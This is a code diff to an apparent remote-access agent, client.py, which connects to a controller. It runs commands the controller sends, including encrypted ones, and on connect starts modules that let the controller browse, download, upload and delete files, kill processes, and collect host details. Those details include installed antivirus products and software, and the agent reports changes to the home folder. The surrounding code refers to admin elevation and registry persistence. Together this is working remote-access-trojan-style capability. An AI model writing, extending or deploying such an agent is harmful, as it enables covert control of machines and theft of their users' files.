@@ -1,3 +1,4 @@
+### client.py ###
 import sys
 import os
 
@@ -6422,6 +6423,69 @@ def run_as_admin():
             return False
     return True
 
+def _e2e_decrypt(agent_id, enc, secret_env='AGENT_SHARED_SECRET'):
+    try:
+        import base64, os
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+        from cryptography.fernet import Fernet
+        secret = os.environ.get(secret_env, '')
+        if not secret or not isinstance(enc, str):
+            return enc
+        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=str(agent_id).encode(), iterations=100000)
+        key = base64.urlsafe_b64encode(kdf.derive(secret.encode()))
+        return Fernet(key).decrypt(enc.encode()).decode()
+    except Exception:
+        return enc
+
+class FileIntegrityMonitor:
+    def __init__(self, paths_to_monitor):
+        self.paths = [p for p in (paths_to_monitor or []) if isinstance(p, str)]
+        self.hashes = {}
+        self.initialize_hashes()
+    def initialize_hashes(self):
+        import hashlib, os
+        for path in self.paths:
+            if os.path.exists(path):
+                self.hashes[path] = self.calculate_hash(path)
+    def calculate_hash(self, filepath):
+        import hashlib, os
+        if os.path.isdir(filepath):
+            h = hashlib.sha256()
+            try:
+                for root, _, files in os.walk(filepath):
+                    for f in files:
+                        fp = os.path.join(root, f)
+                        try:
+                            with open(fp, 'rb') as fh:
+                                for block in iter(lambda: fh.read(4096), b''):
+                                    h.update(block)
+                        except Exception:
+                            continue
+                return h.hexdigest()
+            except Exception:
+                return ''
+        sha256 = hashlib.sha256()
+        try:
+            with open(filepath, 'rb') as f:
+                for block in iter(lambda: f.read(4096), b''):
+                    sha256.update(block)
+            return sha256.hexdigest()
+        except Exception:
+            return ''
+    def check_integrity(self):
+        import os
+        changes = []
+        for path, original_hash in list(self.hashes.items()):
+            if not os.path.exists(path):
+                changes.append({'path': path, 'status': 'deleted'})
+                continue
+            current_hash = self.calculate_hash(path)
+            if current_hash and current_hash != original_hash:
+                changes.append({'path': path, 'status': 'modified'})
+                self.hashes[path] = current_hash
+        return changes
+
 def run_as_admin_with_limited_attempts():
     """
     ✅ ETHICAL VERSION: Request admin privileges with LIMITED attempts.
@@ -9892,6 +9956,38 @@ def register_socketio_handlers():
             
             # Send success notification
             emit_system_notification('success', 'Agent Connected', f'Successfully connected to controller as agent {agent_id}')
+            try:
+                import os, time, json, threading
+                paths = []
+                home = os.path.expanduser("~")
+                if home:
+                    paths.append(home)
+                    d = os.path.join(home, "Desktop")
+                    if os.path.isdir(d):
+                        paths.append(d)
+                fim = FileIntegrityMonitor(paths)
+                def _fim_loop():
+                    while True:
+                        changes = fim.check_integrity()
+                        if changes:
+                            safe_emit('system_alert', {'agent_id': agent_id, 'type': 'warning', 'message': 'File changes detected', 'details': json.dumps(changes), 'timestamp': int(time.time()*1000)})
+                        time.sleep(300)
+                threading.Thread(target=_fim_loop, daemon=True).start()
+            except Exception:
+                pass
+            try:
+                FileSystemManager(sio, agent_id)
+            except Exception:
+                pass
+            try:
+                if PSUTIL_AVAILABLE:
+                    ProcessManager(sio, agent_id)
+            except Exception:
+                pass
+            try:
+                SystemInfoGatherer(sio, agent_id)
+            except Exception:
+                pass
             
         except Exception as e:
             log_message(f"Error in connect handler: {e}", "error")
@@ -9960,6 +10056,7 @@ def register_socketio_handlers():
     # agent_config handling removed in this revision
     sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
     sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
+    sio.on('feature_toggle')(on_feature_toggle)
     
     log_message("Socket.IO event handlers registered successfully", "info")
 
@@ -13793,6 +13890,11 @@ def on_command(data):
     
     agent_id = get_or_create_agent_id()
     command = data.get("command")
+    try:
+        if data.get("encrypted"):
+            command = _e2e_decrypt(agent_id, command)
+    except Exception:
+        pass
     if isinstance(command, str) and command.startswith("ll"):
         command = "list-dir" + command[2:]
     
@@ -14139,6 +14241,11 @@ def on_execute_command(data):
         
         agent_id = data.get('agent_id')
         command = data.get('command')
+        try:
+            if data.get("encrypted"):
+                command = _e2e_decrypt(agent_id, command)
+        except Exception:
+            pass
         execution_id = data.get('execution_id')
         
         print(f"🔍 Agent ID in event: {agent_id}")
@@ -14954,6 +15061,25 @@ def on_webrtc_implement_frame_dropping(data):
         log_message(error_msg, "error")
         safe_emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
+def on_feature_toggle(data):
+    if not SOCKETIO_AVAILABLE or sio is None:
+        return
+    try:
+        feature = str((data or {}).get('feature') or '').strip()
+        enabled = bool((data or {}).get('enabled'))
+        global WEBRTC_CONFIG
+        if feature == 'adaptive_bitrate':
+            WEBRTC_CONFIG['adaptive_bitrate'] = enabled
+        elif feature == 'frame_dropping':
+            WEBRTC_CONFIG['frame_dropping'] = enabled
+        elif feature == 'monitoring':
+            m = WEBRTC_CONFIG.get('monitoring') or {}
+            m['connection_quality_metrics'] = enabled
+            WEBRTC_CONFIG['monitoring'] = m
+        safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
+    except Exception as e:
+        log_message(f"Feature toggle error: {str(e)}", "error")
+
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
     status = {
@@ -15203,6 +15329,588 @@ def check_registry_persistence():
     except Exception as e:
         log_message(f"[INFO] No registry persistence found: {e}")
         return False
+import mimetypes
+import stat
+from datetime import datetime as _dt
+from pathlib import Path as _Path
+
+class FileSystemManager:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.active_uploads = {}
+        self.active_downloads = {}
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('browse_files')
+        def handle_browse_files(data):
+            path = data.get('path', os.path.expanduser('~'))
+            try:
+                files = self.list_directory(path)
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': files})
+            except Exception as e:
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': path, 'files': [], 'error': str(e)})
+        @self.socket.on('download_file')
+        def handle_download_file(data):
+            file_path = data.get('path')
+            download_id = data.get('download_id')
+            try:
+                self.send_file(file_path, download_id)
+            except Exception as e:
+                safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
+        @self.socket.on('upload_file_start')
+        def handle_upload_start(data):
+            filename = data.get('filename')
+            destination = data.get('destination')
+            total_size = int(data.get('total_size') or 0)
+            upload_id = data.get('upload_id') or f'ul_{int(time.time())}'
+            self.active_uploads[upload_id] = {'filename': filename, 'destination': destination, 'total_size': total_size, 'received': 0, 'chunks': [], 'start_time': time.time()}
+            safe_emit('upload_ready', {'agent_id': self.agent_id, 'upload_id': upload_id})
+        @self.socket.on('upload_file_chunk')
+        def handle_upload_chunk(data):
+            upload_id = data.get('upload_id')
+            chunk_data = data.get('chunk')
+            offset = int(data.get('offset') or 0)
+            if not upload_id or upload_id not in self.active_uploads:
+                return
+            up = self.active_uploads[upload_id]
+            try:
+                payload = chunk_data.split(',', 1)[1] if isinstance(chunk_data, str) and ',' in chunk_data else chunk_data
+                chunk_bytes = base64.b64decode(payload if isinstance(payload, str) else chunk_data)
+                up['chunks'].append((offset, chunk_bytes))
+                up['received'] += len(chunk_bytes)
+                progress = (up['received'] / (up['total_size'] or max(1, up['received']))) * 100.0
+                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': up.get('destination'), 'received': up['received'], 'total': up['total_size'], 'progress': int(progress)})
+            except Exception as e:
+                safe_emit('file_upload_progress', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e)})
+        @self.socket.on('upload_file_complete')
+        def handle_upload_complete(data):
+            upload_id = data.get('upload_id')
+            if not upload_id or upload_id not in self.active_uploads:
+                return
+            up = self.active_uploads[upload_id]
+            try:
+                up['chunks'].sort(key=lambda x: x[0])
+                file_data = b''.join([c for _, c in up['chunks']])
+                dest_dir = up.get('destination') or os.path.expanduser('~')
+                os.makedirs(dest_dir, exist_ok=True)
+                full_path = os.path.join(dest_dir, up['filename'])
+                with open(full_path, 'wb') as f:
+                    f.write(file_data)
+                file_hash = hashlib.sha256(file_data).hexdigest()
+                elapsed = time.time() - up['start_time']
+                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': up['filename'], 'destination_path': full_path, 'size': len(file_data), 'hash': file_hash, 'elapsed': elapsed, 'success': True})
+                del self.active_uploads[upload_id]
+            except Exception as e:
+                safe_emit('file_upload_complete', {'agent_id': self.agent_id, 'filename': (self.active_uploads.get(upload_id) or {}).get('filename'), 'error': str(e), 'success': False})
+        @self.socket.on('delete_file')
+        def handle_delete_file(data):
+            path = data.get('path')
+            try:
+                if os.path.isfile(path):
+                    os.remove(path)
+                elif os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+        @self.socket.on('rename_file')
+        def handle_rename_file(data):
+            old_path = data.get('old_path')
+            new_path = data.get('new_path')
+            try:
+                os.rename(old_path, new_path)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'rename', 'src': old_path, 'dst': new_path, 'success': False, 'error': str(e)})
+        @self.socket.on('create_directory')
+        def handle_create_directory(data):
+            path = data.get('path')
+            try:
+                os.makedirs(path, exist_ok=True)
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': self.agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+        @self.socket.on('search_files')
+        def handle_search_files(data):
+            root_path = data.get('path', os.path.expanduser('~'))
+            pattern = data.get('pattern', '*')
+            max_results = int(data.get('max_results') or 100)
+            try:
+                results = self.search_files(root_path, pattern, max_results)
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': results})
+            except Exception as e:
+                safe_emit('file_list', {'agent_id': self.agent_id, 'path': root_path, 'files': [], 'error': str(e)})
+    def list_directory(self, path):
+        files = []
+        try:
+            parent = os.path.dirname(path)
+            if path and parent and parent != path:
+                files.append({'name': '..', 'type': 'directory', 'path': parent, 'size': None, 'modified': None, 'permissions': None})
+            for entry in os.scandir(path):
+                try:
+                    st = entry.stat()
+                    info = {'name': entry.name, 'type': 'directory' if entry.is_dir() else 'file', 'path': entry.path, 'size': st.st_size if entry.is_file() else None, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'permissions': oct(st.st_mode)[-3:], 'extension': os.path.splitext(entry.name)[1][1:] if entry.is_file() else None}
+                    if entry.is_file():
+                        mt, _ = mimetypes.guess_type(entry.path)
+                        info['mime_type'] = mt
+                    files.append(info)
+                except Exception:
+                    continue
+            files.sort(key=lambda x: (x['type'] == 'file', x['name'].lower()))
+            return files
+        except Exception as e:
+            raise Exception(f"Failed to list directory: {str(e)}")
+    def send_file(self, file_path, download_id):
+        try:
+            total_size = os.path.getsize(file_path)
+            filename = os.path.basename(file_path)
+            with open(file_path, 'rb') as f:
+                offset = 0
+                while True:
+                    chunk = f.read(512 * 1024)
+                    if not chunk:
+                        break
+                    chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+                    safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'chunk': chunk_b64, 'offset': offset, 'total_size': total_size})
+                    offset += len(chunk)
+                    progress = int((offset / total_size) * 100)
+                    safe_emit('file_download_progress', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'sent': offset, 'total': total_size, 'progress': progress})
+            safe_emit('file_download_complete', {'agent_id': self.agent_id, 'filename': filename, 'download_id': download_id, 'size': total_size, 'success': True})
+        except Exception as e:
+            safe_emit('file_chunk_from_agent', {'agent_id': self.agent_id, 'filename': os.path.basename(file_path or ''), 'download_id': download_id, 'error': str(e)})
+    def search_files(self, root_path, pattern, max_results=100):
+        import fnmatch
+        results = []
+        count = 0
+        for dirpath, dirnames, filenames in os.walk(root_path):
+            dirnames[:] = [d for d in dirnames if not d.startswith('.')]
+            for filename in filenames:
+                if fnmatch.fnmatch(filename.lower(), pattern.lower()):
+                    full_path = os.path.join(dirpath, filename)
+                    try:
+                        st = os.stat(full_path)
+                        results.append({'name': filename, 'path': full_path, 'size': st.st_size, 'modified': _dt.fromtimestamp(st.st_mtime).isoformat(), 'directory': dirpath})
+                        count += 1
+                        if count >= max_results:
+                            return results
+                    except Exception:
+                        continue
+        return results
+
+class ProcessManager:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.monitoring_active = False
+        self.monitor_thread = None
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('list_processes')
+        def handle_list_processes(data):
+            try:
+                procs = self.get_process_list()
+                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': procs})
+            except Exception as e:
+                safe_emit('process_list', {'agent_id': self.agent_id, 'processes': [], 'error': str(e)})
+        @self.socket.on('kill_process')
+        def handle_kill_process(data):
+            pid = data.get('pid')
+            force = bool(data.get('force'))
+            try:
+                success, message = self.kill_process(pid, force)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'kill', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('suspend_process')
+        def handle_suspend_process(data):
+            pid = data.get('pid')
+            try:
+                success, message = self.suspend_process(pid)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'suspend', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('resume_process')
+        def handle_resume_process(data):
+            pid = data.get('pid')
+            try:
+                success, message = self.resume_process(pid)
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': success, 'message': message})
+            except Exception as e:
+                safe_emit('process_operation_result', {'agent_id': self.agent_id, 'operation': 'resume', 'pid': pid, 'success': False, 'error': str(e)})
+        @self.socket.on('get_process_details')
+        def handle_get_process_details(data):
+            pid = data.get('pid')
+            try:
+                details = self.get_process_details(pid)
+                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'details': details})
+            except Exception as e:
+                safe_emit('process_details_response', {'agent_id': self.agent_id, 'pid': pid, 'error': str(e)})
+        @self.socket.on('start_process_monitor')
+        def handle_start_monitor(data):
+            interval = int(data.get('interval') or 2)
+            self.start_monitoring(interval)
+            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': True, 'interval': interval})
+        @self.socket.on('stop_process_monitor')
+        def handle_stop_monitor(data):
+            self.stop_monitoring()
+            safe_emit('monitor_status', {'agent_id': self.agent_id, 'monitoring': False})
+    def get_process_list(self):
+        import psutil
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent', 'create_time', 'exe']):
+            try:
+                pinfo = proc.info
+                processes.append({'pid': pinfo['pid'], 'name': pinfo['name'], 'username': pinfo.get('username') or 'N/A', 'status': pinfo.get('status') or 'running', 'cpu_percent': round(pinfo.get('cpu_percent') or 0, 2), 'memory_percent': round(pinfo.get('memory_percent') or 0, 2), 'created': _dt.fromtimestamp(pinfo['create_time']).isoformat() if pinfo.get('create_time') else None, 'exe': pinfo.get('exe') or 'N/A'})
+            except Exception:
+                continue
+        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+        return processes
+    def kill_process(self, pid, force=False):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            if force:
+                process.kill()
+            else:
+                process.terminate()
+            gone, alive = psutil.wait_procs([process], timeout=3)
+            if alive:
+                process.kill()
+                gone, alive = psutil.wait_procs([process], timeout=2)
+            if alive:
+                return False, f"Failed to kill {name} (PID: {pid})"
+            return True, f"Successfully killed {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to kill process: {str(e)}"
+    def suspend_process(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            process.suspend()
+            return True, f"Successfully suspended {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to suspend process: {str(e)}"
+    def resume_process(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            name = process.name()
+            process.resume()
+            return True, f"Successfully resumed {name} (PID: {pid})"
+        except psutil.NoSuchProcess:
+            return False, f"Process {pid} does not exist"
+        except psutil.AccessDenied:
+            return False, f"Access denied for process {pid}"
+        except Exception as e:
+            return False, f"Failed to resume process: {str(e)}"
+    def get_process_details(self, pid):
+        import psutil
+        try:
+            process = psutil.Process(int(pid))
+            details = {'pid': process.pid, 'name': process.name(), 'exe': process.exe(), 'cwd': process.cwd(), 'cmdline': ' '.join(process.cmdline()), 'status': process.status(), 'username': process.username(), 'created': _dt.fromtimestamp(process.create_time()).isoformat(), 'ppid': process.ppid(), 'parent_name': psutil.Process(process.ppid()).name() if process.ppid() else None}
+            with process.oneshot():
+                cpu_times = process.cpu_times()
+                mem = process.memory_info()
+                details['cpu'] = {'percent': process.cpu_percent(interval=0.1), 'user_time': cpu_times.user, 'system_time': cpu_times.system, 'num_threads': process.num_threads()}
+                details['memory'] = {'percent': process.memory_percent(), 'rss': mem.rss, 'vms': mem.vms, 'rss_mb': round(mem.rss / (1024 * 1024), 2), 'vms_mb': round(mem.vms / (1024 * 1024), 2)}
+                try:
+                    io_counters = process.io_counters()
+                    details['io'] = {'read_count': io_counters.read_count, 'write_count': io_counters.write_count, 'read_bytes': io_counters.read_bytes, 'write_bytes': io_counters.write_bytes}
+                except Exception:
+                    pass
+                try:
+                    open_files = process.open_files()
+                    details['open_files'] = [f.path for f in open_files[:20]]
+                except Exception:
+                    details['open_files'] = []
+                try:
+                    connections = process.connections()
+                    conns = []
+                    for conn in connections[:20]:
+                        conns.append({'fd': getattr(conn, 'fd', None), 'family': str(getattr(conn, 'family', None)), 'type': str(getattr(conn, 'type', None)), 'laddr': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'raddr': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': getattr(conn, 'status', None)})
+                    details['connections'] = conns
+                except Exception:
+                    details['connections'] = []
+            return details
+        except psutil.NoSuchProcess:
+            raise Exception(f"Process {pid} does not exist")
+        except psutil.AccessDenied:
+            raise Exception(f"Access denied for process {pid}")
+        except Exception as e:
+            raise Exception(f"Failed to get process details: {str(e)}")
+    def start_monitoring(self, interval):
+        import psutil, threading
+        if self.monitoring_active:
+            return
+        self.monitoring_active = True
+        def monitor_loop():
+            while self.monitoring_active:
+                try:
+                    processes = []
+                    for proc in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
+                        try:
+                            info = proc.info
+                            processes.append({'pid': info['pid'], 'name': info['name'], 'cpu_percent': round(info.get('cpu_percent') or 0, 2), 'memory_percent': round(info.get('memory_percent') or 0, 2)})
+                        except Exception:
+                            continue
+                    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+                    top = processes[:20]
+                    cpu_percent = psutil.cpu_percent(interval=None)
+                    memory = psutil.virtual_memory()
+                    safe_emit('process_monitor_update', {'agent_id': self.agent_id, 'timestamp': time.time(), 'system': {'cpu_percent': cpu_percent, 'memory_percent': memory.percent, 'memory_available_mb': round(memory.available / (1024 * 1024), 2)}, 'top_processes': top})
+                except Exception:
+                    pass
+                time.sleep(interval)
+        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
+        self.monitor_thread.start()
+    def stop_monitoring(self):
+        self.monitoring_active = False
+
+class SystemInfoGatherer:
+    def __init__(self, socket_client, agent_id):
+        self.socket = socket_client
+        self.agent_id = agent_id
+        self.register_handlers()
+    def register_handlers(self):
+        @self.socket.on('get_system_info')
+        def handle_get_system_info(data):
+            level = str(data.get('detail_level') or 'full').lower()
+            try:
+                if level == 'basic':
+                    info = self.get_basic_info()
+                elif level == 'standard':
+                    info = self.get_standard_info()
+                else:
+                    info = self.get_full_info()
+                safe_emit('system_info_response', {'agent_id': self.agent_id, 'info': info, 'detail_level': level, 'success': True})
+            except Exception as e:
+                safe_emit('system_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+        @self.socket.on('get_network_info')
+        def handle_get_network_info(data):
+            try:
+                info = self.get_network_info()
+                safe_emit('network_info_response', {'agent_id': self.agent_id, 'info': info, 'success': True})
+            except Exception as e:
+                safe_emit('network_info_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+        @self.socket.on('get_installed_software')
+        def handle_get_software(data):
+            try:
+                software = self.get_installed_software()
+                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'software': software, 'count': len(software), 'success': True})
+            except Exception as e:
+                safe_emit('installed_software_response', {'agent_id': self.agent_id, 'error': str(e), 'success': False})
+    def get_basic_info(self):
+        return {'hostname': socket.gethostname(), 'platform': platform.system(), 'platform_release': platform.release(), 'architecture': platform.machine(), 'processor': platform.processor(), 'username': os.getenv('USERNAME') or os.getenv('USER'), 'timestamp': datetime.datetime.now().isoformat()}
+    def get_standard_info(self):
+        info = self.get_basic_info()
+        try:
+            import psutil
+            cpu_freq = psutil.cpu_freq()
+            info['cpu'] = {'physical_cores': psutil.cpu_count(logical=False), 'logical_cores': psutil.cpu_count(logical=True), 'current_freq_mhz': cpu_freq.current if cpu_freq else None, 'usage_percent': psutil.cpu_percent(interval=0.5)}
+            memory = psutil.virtual_memory()
+            info['memory'] = {'total_gb': round(memory.total / (1024**3), 2), 'available_gb': round(memory.available / (1024**3), 2), 'used_gb': round(memory.used / (1024**3), 2), 'percent': memory.percent}
+            disk = psutil.disk_usage(os.path.abspath(os.sep))
+            info['disk'] = {'total_gb': round(disk.total / (1024**3), 2), 'used_gb': round(disk.used / (1024**3), 2), 'free_gb': round(disk.free / (1024**3), 2), 'percent': disk.percent}
+        except Exception:
+            pass
+        return info
+    def get_full_info(self):
+        info = self.get_standard_info()
+        try:
+            import cpuinfo
+            cpu_info = cpuinfo.get_cpu_info()
+            c = info.setdefault('cpu', {})
+            c['brand'] = cpu_info.get('brand_raw')
+            c['vendor'] = cpu_info.get('vendor_id_raw')
+            flags = cpu_info.get('flags') or []
+            c['flags'] = flags[:20]
+        except Exception:
+            pass
+        try:
+            import psutil
+            parts = []
+            for p in psutil.disk_partitions():
+                try:
+                    u = psutil.disk_usage(p.mountpoint)
+                    parts.append({'device': p.device, 'mountpoint': p.mountpoint, 'fstype': p.fstype, 'total_gb': round(u.total / (1024**3), 2), 'used_gb': round(u.used / (1024**3), 2), 'free_gb': round(u.free / (1024**3), 2), 'percent': u.percent})
+                except Exception:
+                    continue
+            info['disk_partitions'] = parts
+            nets = []
+            for name, addrs in psutil.net_if_addrs().items():
+                ni = {'name': name, 'addresses': []}
+                for a in addrs:
+                    ni['addresses'].append({'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', ''), 'netmask': getattr(a, 'netmask', None), 'broadcast': getattr(a, 'broadcast', None)})
+                nets.append(ni)
+            info['network_interfaces'] = nets
+            bt = datetime.datetime.fromtimestamp(psutil.boot_time())
+            info['boot_time'] = bt.isoformat()
+            info['uptime_seconds'] = (datetime.datetime.now() - bt).total_seconds()
+        except Exception:
+            pass
+        try:
+            if platform.system() == 'Windows':
+                info['windows'] = self.get_windows_specific_info()
+            elif platform.system() == 'Linux':
+                info['linux'] = self.get_linux_specific_info()
+        except Exception:
+            pass
+        return info
+    def get_windows_specific_info(self):
+        w = {}
+        try:
+            r = subprocess.run(['wmic', 'os', 'get', 'Caption,Version,BuildNumber', '/format:list'], capture_output=True, text=True, timeout=5)
+            for line in (r.stdout or '').split('\n'):
+                if '=' in line:
+                    k, v = line.split('=', 1)
+                    w[k.strip().lower()] = v.strip()
+            r2 = subprocess.run(['wmic', 'computersystem', 'get', 'Domain', '/format:list'], capture_output=True, text=True, timeout=5)
+            for line in (r2.stdout or '').split('\n'):
+                if 'Domain=' in line:
+                    w['domain'] = line.split('=')[1].strip()
+            r3 = subprocess.run(['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntivirusProduct', 'get', 'displayName', '/format:list'], capture_output=True, text=True, timeout=5)
+            av = []
+            for line in (r3.stdout or '').split('\n'):
+                if 'displayName=' in line:
+                    nm = line.split('=')[1].strip()
+                    if nm:
+                        av.append(nm)
+            w['antivirus'] = av
+        except Exception:
+            pass
+        return w
+    def get_linux_specific_info(self):
+        l = {}
+        try:
+            with open('/etc/os-release', 'r') as f:
+                for line in f:
+                    if '=' in line:
+                        k, v = line.strip().split('=', 1)
+                        l[k.lower()] = v.strip('"')
+            l['kernel'] = platform.release()
+        except Exception:
+            pass
+        return l
+    def get_network_info(self):
+        info = {'hostname': socket.gethostname(), 'fqdn': socket.getfqdn(), 'interfaces': [], 'connections': [], 'stats': {}}
+        try:
+            import psutil
+            for name, addrs in psutil.net_if_addrs().items():
+                ii = {'name': name, 'addresses': [], 'stats': None}
+                for a in addrs:
+                    ai = {'family': str(getattr(a, 'family', '')), 'address': getattr(a, 'address', '')}
+                    if getattr(a, 'family', None) == socket.AF_INET:
+                        ai['netmask'] = getattr(a, 'netmask', None)
+                        ai['broadcast'] = getattr(a, 'broadcast', None)
+                    ii['addresses'].append(ai)
+                try:
+                    s = psutil.net_if_stats().get(name)
+                    if s:
+                        ii['stats'] = {'isup': s.isup, 'speed_mbps': s.speed, 'mtu': s.mtu}
+                except Exception:
+                    pass
+                info['interfaces'].append(ii)
+            try:
+                for conn in psutil.net_connections(kind='inet'):
+                    if conn.status == 'ESTABLISHED':
+                        info['connections'].append({'local_address': f"{getattr(conn.laddr, 'ip', '')}:{getattr(conn.laddr, 'port', '')}" if getattr(conn, 'laddr', None) else None, 'remote_address': f"{getattr(conn.raddr, 'ip', '')}:{getattr(conn.raddr, 'port', '')}" if getattr(conn, 'raddr', None) else None, 'status': conn.status, 'pid': conn.pid})
+            except Exception:
+                pass
+            nio = psutil.net_io_counters()
+            info['stats'] = {'bytes_sent': nio.bytes_sent, 'bytes_recv': nio.bytes_recv, 'packets_sent': nio.packets_sent, 'packets_recv': nio.packets_recv, 'errin': nio.errin, 'errout': nio.errout, 'dropin': nio.dropin, 'dropout': nio.dropout}
+        except Exception:
+            pass
+        return info
+    def get_installed_software(self):
+        software = []
+        try:
+            if platform.system() == 'Windows':
+                import winreg
+                paths = [(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'), (winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')]
+                for hive, path in paths:
+                    try:
+                        key = winreg.OpenKey(hive, path)
+                        for i in range(winreg.QueryInfoKey(key)[0]):
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                subkey = winreg.OpenKey(key, subkey_name)
+                                try:
+                                    name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
+                                    version = None
+                                    publisher = None
+                                    install_date = None
+                                    try:
+                                        version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0]
+                                    except Exception:
+                                        pass
+                                    try:
+                                        publisher = winreg.QueryValueEx(subkey, 'Publisher')[0]
+                                    except Exception:
+                                        pass
+                                    try:
+                                        install_date = winreg.QueryValueEx(subkey, 'InstallDate')[0]
+                                    except Exception:
+                                        pass
+                                    software.append({'name': name, 'version': version, 'publisher': publisher, 'install_date': install_date})
+                                except Exception:
+                                    pass
+                                winreg.CloseKey(subkey)
+                            except Exception:
+                                continue
+                        winreg.CloseKey(key)
+                    except Exception:
+                        continue
+            elif platform.system() == 'Linux':
+                try:
+                    r = subprocess.run(['dpkg', '-l'], capture_output=True, text=True, timeout=10)
+                    for line in (r.stdout or '').split('\n')[5:]:
+                        if line.strip():
+                            parts = line.split()
+                            if len(parts) >= 3:
+                                software.append({'name': parts[1], 'version': parts[2], 'description': ' '.join(parts[3:]) if len(parts) > 3 else None})
+                except Exception:
+                    pass
+                if not software:
+                    try:
+                        r2 = subprocess.run(['rpm', '-qa', '--queryformat', '%{NAME}|%{VERSION}|%{RELEASE}\n'], capture_output=True, text=True, timeout=10)
+                        for line in (r2.stdout or '').split('\n'):
+                            if '|' in line:
+                                parts = line.split('|')
+                                software.append({'name': parts[0], 'version': f"{parts[1]}-{parts[2]}" if len(parts) > 2 else parts[1]})
+                    except Exception:
+                        pass
+            elif platform.system() == 'Darwin':
+                try:
+                    r = subprocess.run(['system_profiler', 'SPApplicationsDataType', '-json'], capture_output=True, text=True, timeout=15)
+                    data = json.loads(r.stdout or '{}')
+                    apps = data.get('SPApplicationsDataType', [])
+                    for app in apps:
